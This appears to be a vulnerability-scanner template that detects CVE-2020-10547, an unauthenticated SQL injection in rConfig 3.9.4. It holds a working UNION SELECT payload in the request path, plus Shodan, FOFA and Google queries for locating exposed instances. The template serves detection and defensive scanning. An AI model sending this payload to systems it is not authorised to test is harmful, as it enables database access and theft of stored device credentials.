http:
- matchers:
  - part: body
    type: word
    words:
    - '[project-discovery]'
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/compliancepolicyelements.inc.php?search=True&searchField=antani''+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL,NULL,NULL+--+&searchColumn=elementName&searchOption=contains'
id: CVE-2020-10547
info:
  author: madrobot
  classification:
    cpe: cpe:2.3:a:rconfig:rconfig:*:*:*:*:*:*:*:*
    cve-id: CVE-2020-10547
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.9955
    epss-score: 0.89969
  description: rConfig 3.9.4 and previous versions has unauthenticated compliancepolicyelements.inc.php
    SQL injection. Because nodes' passwords are stored by default in cleartext, this
    vulnerability leads to lateral movement, granting an attacker access to monitored
    network devices.
  impact: 'Successful exploitation of this vulnerability allows an attacker to execute
    arbitrary SQL queries, potentially leading to unauthorized access, data manipulation.

    '
  metadata:
    fofa-query: title="rconfig"
    google-query: intitle:"rconfig"
    max-request: 1
    product: rconfig
    shodan-query: http.title:"rconfig"
    vendor: rconfig
  name: rConfig 3.9.4 - SQL Injection
  reference:
  - https://github.com/theguly/exploits/blob/master/CVE-2020-10547.py https://theguly.github.io/2020/09/rconfig-3.9.4-multiple-vulnerabilities/
  - https://github.com/theguly/exploits/blob/master/CVE-2020-10547.py
  - https://theguly.github.io/2020/09/rconfig-3.9.4-multiple-vulnerabilities/
  - https://github.com/theguly/exploits
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Upgrade to the latest version of rConfig or apply the provided patch
    to fix the SQL Injection vulnerability.

    '
  severity: critical
  tags: cve,cve2020,rconfig,sqli,vuln
